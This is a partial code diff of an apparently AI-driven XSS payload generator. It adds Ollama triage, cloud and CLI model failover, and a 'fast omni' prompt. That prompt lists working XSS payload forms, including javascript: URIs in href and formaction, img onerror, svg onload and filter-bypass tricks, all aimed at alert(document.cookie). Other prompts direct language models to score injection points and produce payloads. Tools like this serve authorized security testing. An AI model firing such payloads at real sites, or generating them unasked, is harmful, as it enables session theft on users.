         reference_payloads=reference_payloads,
         waf=waf,
         past_findings=past_findings,
@@ -397,12 +1894,122 @@ def _generate_with_ollama(
     response = requests.post(
         f"{OLLAMA_BASE_URL}/api/generate",
         json={"model": resolved_model, "prompt": prompt, "stream": False},
-        timeout=120,
+        timeout=max(1, request_timeout_seconds),
     )
     response.raise_for_status()
     body = response.json()
     data = _extract_json_blob(body.get("response", ""))
     return _normalize_payloads(data.get("payloads", []), source="ollama"), resolved_model
+
+
+def _generate_dom_local_with_ollama(
+    context: ParsedContext,
+    model: str,
+    waf: str | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+    request_timeout_seconds: int = 60,
+    reference_payloads: list[Any] | None = None,
+) -> tuple[list[PayloadCandidate], str]:
+    ready, resolved_model, reason = _ensure_ollama_model(model)
+    if not ready:
+        raise RuntimeError(f"Ollama unavailable: {reason}")
+    prompt = _compact_dom_prompt_for_local(
+        context,
+        waf=waf,
+        past_findings=past_findings,
+        past_lessons=past_lessons,
+        reference_payloads=reference_payloads,
+    )
+    response = requests.post(
+        f"{OLLAMA_BASE_URL}/api/generate",
+        json={"model": resolved_model, "prompt": prompt, "stream": False},
+        timeout=max(1, request_timeout_seconds),
+    )
+    response.raise_for_status()
+    body = response.json()
+    data = _extract_json_blob(body.get("response", ""))
+    return _normalize_payloads(data.get("payloads", []), source="ollama"), resolved_model
+
+
+def triage_probe_result(
+    *,
+    param_name: str,
+    context_type: str,
+    surviving_chars: str,
+    reflection_snippet: str,
+    waf: str | None,
+    delivery_mode: str,
+    model: str,
+    request_timeout_seconds: int = 25,
+) -> dict:
+    """Ask the local Ollama model to triage a probe result.
+
+    The local model's job is NOT to generate payloads — it's to classify
+    whether this injection point is worth spending cloud API budget on.
+
+    Returns a dict:
+      score: int (1-10, 10 = highest XSS potential)
+      should_escalate: bool
+      reason: str  (brief justification)
+      context_notes: str  (hints to pass to the cloud payload generator)
+    """
+    ready, resolved_model, reason_msg = _ensure_ollama_model(model)
+    if not ready:
+        # Unavailable → safe fallback: let cloud decide
+        return {
+            "score": 5,
+            "should_escalate": True,
+            "reason": f"Local model unavailable: {reason_msg}",
+            "context_notes": "",
+        }
+
+    waf_line = f"WAF detected: {waf}" if waf else "No WAF detected"
+    prompt = (
+        "You are a security analyst triaging web parameter injection points for XSS.\n"
+        "Analyze the probe result below and decide if it is worth spending cloud AI budget on.\n\n"
+        f"Parameter: {param_name}\n"
+        f"Delivery: {delivery_mode}\n"
+        f"Injection context: {context_type}\n"
+        f"Surviving chars (passed the filter unmodified): {surviving_chars or 'unknown'}\n"
+        f"Reflection snippet (how input appeared in the response):\n{reflection_snippet or '(not available)'}\n"
+        f"{waf_line}\n\n"
+        "Scoring guide:\n"
+        "  9-10 = Script/JS context with unfiltered quotes/parens, or unencoded attr with event handler potential\n"
+        "  7-8  = HTML context with surviving angle-brackets or attr context with one quote type surviving\n"
+        "  5-6  = Partial filter, some hope with obfuscation or encoding tricks\n"
+        "  3-4  = Heavy encoding/stripping but maybe a niche vector exists\n"
+        "  1-2  = Fully sanitised, no viable XSS path\n\n"
+        "Return ONLY valid JSON, no markdown:\n"
+        '{"score": <1-10>, "should_escalate": <true|false>, '
+        '"reason": "<one sentence>", "context_notes": "<hints for payload generator>"}'
+    )
+
+    try:
+        response = requests.post(
+            f"{OLLAMA_BASE_URL}/api/generate",
+            json={"model": resolved_model, "prompt": prompt, "stream": False},
+            timeout=max(1, request_timeout_seconds),
+        )
+        response.raise_for_status()
+        raw = response.json().get("response", "")
+        data = _extract_json_blob(raw)
+        if not isinstance(data, dict):
+            raise ValueError("non-dict response")
+        return {
+            "score": max(1, min(10, int(data.get("score", 5)))),
+            "should_escalate": bool(data.get("should_escalate", True)),
+            "reason": str(data.get("reason", "")),
+            "context_notes": str(data.get("context_notes", "")),
+        }
+    except Exception as exc:
+        log.debug("Local triage error for param=%s: %s — defaulting to escalate", param_name, exc)
+        return {
+            "score": 5,
+            "should_escalate": True,
+            "reason": f"Triage parse error: {exc}",
+            "context_notes": "",
+        }
 
 
 # ---------------------------------------------------------------------------
@@ -419,13 +2026,18 @@ def _generate_with_openai_compat(
     waf: str | None = None,
     past_findings: list[Finding] | None = None,
     past_lessons: list[Any] | None = None,
+    request_timeout_seconds: int = 120,
+    phase: str = "research",
+    strategy_hint: str | None = None,
 ) -> list[PayloadCandidate]:
-    prompt = _prompt_for_context(
+    prompt = _prompt_for_generation_phase(
         context,
+        phase=phase,
         reference_payloads=reference_payloads,
         waf=waf,
         past_findings=past_findings,
         past_lessons=past_lessons,
+        strategy_hint=strategy_hint,
     )
     headers = {
         "Authorization": f"Bearer {api_key}",
@@ -454,7 +2066,7 @@ def _generate_with_openai_compat(
             ],
             "temperature": 0.35,
         },
-        timeout=120,
+        timeout=max(1, request_timeout_seconds),
     )
     response.raise_for_status()
     body = response.json()
@@ -470,6 +2082,9 @@ def _generate_with_openrouter(
     waf: str | None = None,
     past_findings: list[Finding] | None = None,
     past_lessons: list[Any] | None = None,
+    request_timeout_seconds: int = 120,
+    phase: str = "research",
+    strategy_hint: str | None = None,
 ) -> list[PayloadCandidate]:
     from ai_xss_generator.config import load_api_key
     api_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
@@ -485,6 +2100,9 @@ def _generate_with_openrouter(
         waf=waf,
         past_findings=past_findings,
         past_lessons=past_lessons,
+        request_timeout_seconds=request_timeout_seconds,
+        phase=phase,
+        strategy_hint=strategy_hint,
     )
 
 
@@ -494,6 +2112,9 @@ def _generate_with_openai(
     waf: str | None = None,
     past_findings: list[Finding] | None = None,
     past_lessons: list[Any] | None = None,
+    request_timeout_seconds: int = 120,
+    phase: str = "research",
+    strategy_hint: str | None = None,
 ) -> list[PayloadCandidate]:
     from ai_xss_generator.config import load_api_key
     api_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
@@ -509,7 +2130,174 @@ def _generate_with_openai(
         waf=waf,
         past_findings=past_findings,
         past_lessons=past_lessons,
+        request_timeout_seconds=request_timeout_seconds,
+        phase=phase,
+        strategy_hint=strategy_hint,
     )
+
+
+# ---------------------------------------------------------------------------
+# Lightweight strategy analysis
+# ---------------------------------------------------------------------------
+
+def _strategy_hint_schema() -> dict[str, Any]:
+    return {
+        "type": "object",
+        "properties": {
+            "strategy_hint": {"type": "string"},
+        },
+        "required": ["strategy_hint"],
+        "additionalProperties": False,
+    }
+
+
+def _strategy_hint_prompt(
+    *,
+    generated_count: int,
+    reflected_count: int,
+    surviving_chars: str,
+    waf: str | None,
+    context_type: str,
+) -> str:
+    return (
+        "You are triaging failed payload execution for an authorized XSS assessment.\n"
+        "Return ONLY strict JSON with {\"strategy_hint\": \"...\"}.\n\n"
+        "Fast attempts exhausted. Results:\n"
+        f"- {generated_count} payloads generated, {reflected_count} reflected, 0 executed\n"
+        f"- Surviving chars: {surviving_chars or '(none observed)'}\n"
+        f"- WAF: {waf or 'none'}\n"
+        f"- Reflection context: {context_type or 'unknown'}\n"
+        "Why might payloads reflect but not execute? Pick ONE strategy for deeper analysis.\n"
+        "Keep strategy_hint to one short sentence naming one concrete pivot."
+    )
+
+
+def analyze_deep_strategy_hint(
+    *,
+    context: ParsedContext,
+    cloud_model: str,
+    generated_count: int,
+    reflected_count: int,
+    waf: str | None = None,
+    ai_backend: str = "api",
+    cli_tool: str = "claude",
+    cli_model: str | None = None,
+    phase_profile: str = "normal",
+) -> str:
+    from ai_xss_generator.ai_capabilities import (
+        GENERATION_ROLE,
+        recommended_api_timeout_seconds_for_phase,
+        recommended_timeout_seconds_for_phase,
+    )
+    from ai_xss_generator.cli_runner import generate_via_cli_with_tool
+    from ai_xss_generator.config import load_api_key
+
+    _, context_type, surviving_chars = _extract_probe_context(context)
+    dom_runtime = _extract_dom_runtime_context(context)
+    if dom_runtime:
+        context_type = dom_runtime.get("sink", "") or context_type
+    prompt = _strategy_hint_prompt(
+        generated_count=generated_count,
+        reflected_count=reflected_count,
+        surviving_chars=surviving_chars,
+        waf=waf,
+        context_type=context_type,
+    )
+    schema = _strategy_hint_schema()
+
+    if ai_backend == "cli":
+        timeout_seconds = recommended_timeout_seconds_for_phase(
+            cli_tool,
+            GENERATION_ROLE,
+            "scout",
+            30,
+            profile=phase_profile,
+        )
+        try:
+            raw, _ = generate_via_cli_with_tool(
+                cli_tool,
+                prompt,
+                cli_model,
+                timeout_seconds=timeout_seconds,
+                schema=schema,
+            )
+            data = _extract_json_blob(raw)
+            return str(data.get("strategy_hint", "") or "").strip()
+        except Exception:
+            return ""
+
+    api_timeout_seconds = recommended_api_timeout_seconds_for_phase(
+        cloud_model,
+        GENERATION_ROLE,
+        "scout",
+        45,
+        profile=phase_profile,
+    )
+    headers = {"Content-Type": "application/json"}
+
+    openrouter_key = os.environ.get("OPENROUTER_API_KEY", "") or load_api_key("openrouter_api_key")
+    if openrouter_key:
+        try:
+            response = requests.post(
+                f"{OPENROUTER_BASE_URL}/chat/completions",
+                headers={
+                    **headers,
+                    "Authorization": f"Bearer {openrouter_key}",
+                    "HTTP-Referer": "https://github.com/axss",
+                    "X-Title": "axss",
+                },
+                json={
+                    "model": cloud_model,
+                    "response_format": {"type": "json_object"},
+                    "messages": [
+                        {
+                            "role": "system",
+                            "content": "Return strict JSON for authorized XSS strategy triage.",
+                        },
+                        {"role": "user", "content": prompt},
+                    ],
+                    "temperature": 0.2,
+                },
+                timeout=max(1, api_timeout_seconds),
+            )
+            response.raise_for_status()
+            content = response.json()["choices"][0]["message"]["content"]
+            data = _extract_json_blob(content)
+            return str(data.get("strategy_hint", "") or "").strip()
+        except Exception:
+            pass
+
+    openai_key = os.environ.get("OPENAI_API_KEY", "") or load_api_key("openai_api_key")
+    if openai_key:
+        try:
+            response = requests.post(
+                f"{OPENAI_BASE_URL}/chat/completions",
+                headers={
+                    **headers,
+                    "Authorization": f"Bearer {openai_key}",
+                },
+                json={
+                    "model": OPENAI_FALLBACK_MODEL,
+                    "response_format": {"type": "json_object"},
+                    "messages": [
+                        {
+                            "role": "system",
+                            "content": "Return strict JSON for authorized XSS strategy triage.",
+                        },
+                        {"role": "user", "content": prompt},
+                    ],
+                    "temperature": 0.2,
+                },
+                timeout=max(1, api_timeout_seconds),
+            )
+            response.raise_for_status()
+            content = response.json()["choices"][0]["message"]["content"]
+            data = _extract_json_blob(content)
+            return str(data.get("strategy_hint", "") or "").strip()
+        except Exception:
+            pass
+
+    return ""
 
 
 # ---------------------------------------------------------------------------
@@ -524,19 +2312,66 @@ def _generate_with_cli(
     waf: str | None = None,
     past_findings: list[Finding] | None = None,
     past_lessons: list[Any] | None = None,
-) -> list[PayloadCandidate]:
-    """Generate payloads by calling the claude or codex CLI subprocess."""
-    from ai_xss_generator.cli_runner import generate_via_cli
-    prompt = _prompt_for_context(
-        context,
-        reference_payloads=reference_payloads,
-        waf=waf,
-        past_findings=past_findings,
-        past_lessons=past_lessons,
-    )
-    raw = generate_via_cli(tool, prompt, cli_model)
-    data = _extract_json_blob(raw)
-    return _normalize_payloads(data.get("payloads", []), source=f"cli:{tool}")
+    phase_profile: str = "normal",
+    deep: bool = False,
+    phases: tuple[str, ...] | None = None,
+    strategy_hint: str | None = None,
+) -> tuple[list[PayloadCandidate], str]:
+    """Generate payloads by calling the CLI backend, with cross-tool failover."""
+    from ai_xss_generator.cli_runner import _trace_preview, generate_via_cli_with_tool
+    from ai_xss_generator.ai_capabilities import GENERATION_ROLE, recommended_timeout_seconds_for_phase
+
+    last_error: Exception | None = None
+    last_tool = tool
+    for phase in _resolve_generation_phases(deep=deep, phases=phases):
+        prompt = _prompt_for_generation_phase(
+            context,
+            phase=phase,
+            reference_payloads=reference_payloads,
+            waf=waf,
+            past_findings=past_findings,
+            past_lessons=past_lessons,
+            strategy_hint=strategy_hint,
+        )
+        timeout_seconds = recommended_timeout_seconds_for_phase(
+            tool,
+            GENERATION_ROLE,
+            phase,
+            60,
+            profile=phase_profile,
+        )
+        schema = _generation_output_schema(phase)
+        try:
+            raw, actual_tool = generate_via_cli_with_tool(
+                tool,
+                prompt,
+                cli_model,
+                timeout_seconds=timeout_seconds,
+                schema=schema,
+            )
+            last_tool = actual_tool
+            log.debug("CLI backend resolved to %s for %s (%s phase)", actual_tool, context.source, phase)
+            data = _extract_json_blob(raw)
+            payloads = _normalize_payloads(data.get("payloads", []), source=f"cli:{actual_tool}")
+            if not _is_weak_output(payloads) or phase == "research":
+                return payloads, actual_tool
+        except Exception as exc:
+            last_error = exc
+            raw_preview = ""
+            if isinstance(exc, Exception):
+                raw_preview = ""
+            log.debug(
+                "CLI backend (%s) failed for %s during %s phase: %s%s",
+                last_tool,
+                context.source,
+                phase,
+                exc,
+                f"\nRaw preview:\n{_trace_preview(raw_preview)}" if raw_preview else "",
+            )
+            continue
+    if last_error is not None:
+        raise last_error
+    return [], last_tool
 
 
 def _try_cloud(
@@ -549,6 +2384,10 @@ def _try_cloud(
     ai_backend: str = "api",
     cli_tool: str = "claude",
     cli_model: str | None = None,
+    phase_profile: str = "normal",
+    deep: bool = False,
+    phases: tuple[str, ...] | None = None,
+    strategy_hint: str | None = None,
 ) -> tuple[list[PayloadCandidate], str]:
     """Attempt cloud generation. Returns (payloads, engine_label).
 
@@ -566,27 +2405,60 @@ def _try_cloud(
     # ── CLI backend ──────────────────────────────────────────────────────────
     if ai_backend == "cli":
         try:
-            payloads = _generate_with_cli(context, cli_tool, cli_model, **kwargs)
-            return payloads, f"cli:{cli_tool}"
+            payloads, actual_tool = _generate_with_cli(
+                context,
+                cli_tool,
+                cli_model,
+                phase_profile=phase_profile,
+                deep=deep,
+                phases=phases,
+                strategy_hint=strategy_hint,
+                **kwargs,
+            )
+            return payloads, f"cli:{actual_tool}"
         except Exception as exc:
             log.debug("CLI backend (%s) failed: %s", cli_tool, exc)
             return [], ""
 
     # ── API backend (original behaviour) ────────────────────────────────────
     from ai_xss_generator.config import load_api_key
-    if os.environ.get("OPENROUTER_API_KEY") or load_api_key("openrouter_api_key"):
-        try:
-            payloads = _generate_with_openrouter(context, cloud_model, **kwargs)
-            return payloads, "openrouter"
-        except Exception:
-            pass
+    from ai_xss_generator.ai_capabilities import GENERATION_ROLE, recommended_api_timeout_seconds_for_phase
+    for phase in _resolve_generation_phases(deep=deep, phases=phases):
+        api_timeout_seconds = recommended_api_timeout_seconds_for_phase(
+            cloud_model,
+            GENERATION_ROLE,
+            phase,
+            120,
+            profile=phase_profile,
+        )
+        if os.environ.get("OPENROUTER_API_KEY") or load_api_key("openrouter_api_key"):
+            try:
+                payloads = _generate_with_openrouter(
+                    context,
+                    cloud_model,
+                    request_timeout_seconds=api_timeout_seconds,
+                    phase=phase,
+                    strategy_hint=strategy_hint,
+                    **kwargs,
+                )
+                if not _is_weak_output(payloads) or phase == "research":
+                    return payloads, "openrouter"
+            except Exception:
+                pass
 
-    if os.environ.get("OPENAI_API_KEY") or load_api_key("openai_api_key"):
-        try:
-            payloads = _generate_with_openai(context, **kwargs)
-            return payloads, "openai"
-        except Exception:
-            pass
+        if os.environ.get("OPENAI_API_KEY") or load_api_key("openai_api_key"):
+            try:
+                payloads = _generate_with_openai(
+                    context,
+                    request_timeout_seconds=api_timeout_seconds,
+                    phase=phase,
+                    strategy_hint=strategy_hint,
+                    **kwargs,
+                )
+                if not _is_weak_output(payloads) or phase == "research":
+                    return payloads, "openai"
+            except Exception:
+                pass
 
     return [], ""
 
@@ -712,12 +2584,17 @@ def generate_cloud_payloads(
     context: "ParsedContext",
     cloud_model: str,
     waf: str | None = None,
+    reference_payloads: list[Any] | None = None,
     past_findings: "list[Finding] | None" = None,
     past_lessons: "list[Any] | None" = None,
     ai_backend: str = "api",
     cli_tool: str = "claude",
     cli_model: str | None = None,
     memory_profile: dict[str, Any] | None = None,
+    phase_profile: str = "normal",
+    deep: bool = False,
+    phases: tuple[str, ...] | None = None,
+    strategy_hint: str | None = None,
     # Legacy params — accepted but ignored
     allowed_memory_tiers: "Any" = None,
     allowed_lesson_tiers: "Any" = None,
@@ -731,6 +2608,7 @@ def generate_cloud_payloads(
     or the cloud call fails.
     """
     sink_type, context_type, surviving_chars = _extract_probe_context(context)
+    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
     memory_profile = memory_profile or build_memory_profile(
         context=context,
         waf_name=waf,
@@ -746,19 +2624,85 @@ def generate_cloud_payloads(
             auth_required=bool(memory_profile.get("auth_required", False)),
         )
 
+    # Fast omni mode: augment strategy_hint with broad-spectrum instructions so
+    # the model covers all injection contexts without probe context to guide it.
+    if phase_profile == "fast_omni":
+        _fast_omni_note = (
+            "FAST OMNI MODE: No probe was run on this target. Generate a broad-spectrum payload set "
+            "covering ALL common injection contexts:\n"
+            "- HTML body: <script>, <img onerror>, <svg onload>, <details ontoggle>\n"
+            "- HTML attributes (href, src, action, formaction): javascript: URI payloads — "
+            '<a href="javascript:alert(document.cookie)">, '
+            '<button formaction="javascript:alert(document.cookie)">\n'
+            "- Attribute event handlers: onload, onerror, onfocus (quoted and unquoted)\n"
+            "- JS string breakout: single quote, double quote, template literal contexts\n"
+            "- Filter bypass patterns: HTML entities, case variation, unusual whitespace, "
+            "mXSS (mutation XSS) patterns\n"
+            "- Navigation sinks: location.href, location.assign, window.open\n"
+            "Include at least 2 payloads per context class. Payloads must target alert(document.cookie)."
+        )
+        strategy_hint = (
+            _fast_omni_note if not strategy_hint
+            else f"{_fast_omni_note}\n\nAdditional context: {strategy_hint}"
+        )
+
     payloads, engine = _try_cloud(
         context=context,
         cloud_model=cloud_model,
-        reference_payloads=None,
+        reference_payloads=reference_payloads,
         waf=waf,
         past_findings=past_findings,
         past_lessons=past_lessons,
         ai_backend=ai_backend,
         cli_tool=cli_tool,
         cli_model=cli_model,
+        phase_profile=phase_profile,
+        deep=deep,
+        phases=phases,
+        strategy_hint=strategy_hint,
     )
 
     return payloads, engine
+
+
+def generate_dom_local_payloads(
+    context: ParsedContext,
+    model: str,
+    waf: str | None = None,
+    reference_payloads: list[Any] | None = None,
+    past_findings: list[Finding] | None = None,
+    past_lessons: list[Any] | None = None,
+    memory_profile: dict[str, Any] | None = None,
+    local_timeout_seconds: int = 60,
+) -> tuple[list[PayloadCandidate], str]:
+    """Generate a compact DOM-specific local payload set for active scans."""
+    dom_runtime = _extract_dom_runtime_context(context)
+    sink_type = dom_runtime.get("sink", "") or (context.dom_sinks[0].sink if context.dom_sinks else "")
+    memory_profile = memory_profile or build_memory_profile(
+        context=context,
+        waf_name=waf,
+        delivery_mode="dom",
+    )
+    if past_findings is None:
+        past_findings = relevant_findings(
+            sink_type=sink_type,
+            context_type="dom_xss",
+            surviving_chars="",
+            waf_name=str(memory_profile.get("waf_name", "")),
+            delivery_mode=str(memory_profile.get("delivery_mode", "")),
+            frameworks=tuple(memory_profile.get("frameworks", [])),
+            auth_required=bool(memory_profile.get("auth_required", False)),
+        )
+
+    return _generate_dom_local_with_ollama(
+        context=context,
+        model=model,
+        waf=waf,
+        past_findings=past_findings,
+        past_lessons=past_lessons,
+        request_timeout_seconds=local_timeout_seconds,
+        reference_payloads=reference_payloads,
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -799,6 +2743,8 @@ def generate_payloads(
     cli_model: str | None = None,
     past_lessons: list[Any] | None = None,
     memory_profile: dict[str, Any] | None = None,
+    local_timeout_seconds: int = 120,
+    deep: bool = False,
     # Legacy params — accepted but ignored
     allowed_memory_tiers: Any = None,
     allowed_lesson_tiers: Any = None,
@@ -817,6 +2763,7 @@ def generate_payloads(
     Returns (payloads, engine, used_fallback, resolved_model).
     """
     mutator_plugins = mutator_plugins or []
+    reference_payloads = _merged_reference_payloads(reference_payloads, past_lessons)
 
     if progress is not None:
         progress("Loading relevant curated findings...")
@@ -857,6 +2804,7 @@ def generate_payloads(
             waf=waf,
             past_findings=past_findings,
             past_lessons=past_lessons,
+            request_timeout_seconds=local_timeout_seconds,
         )
         engine = "ollama"
         used_fallback = False
@@ -879,6 +2827,7 @@ def generate_payloads(
             ai_backend=ai_backend,
             cli_tool=cli_tool,
             cli_model=cli_model,
+            deep=deep,
         )
 
         if cloud_payloads:
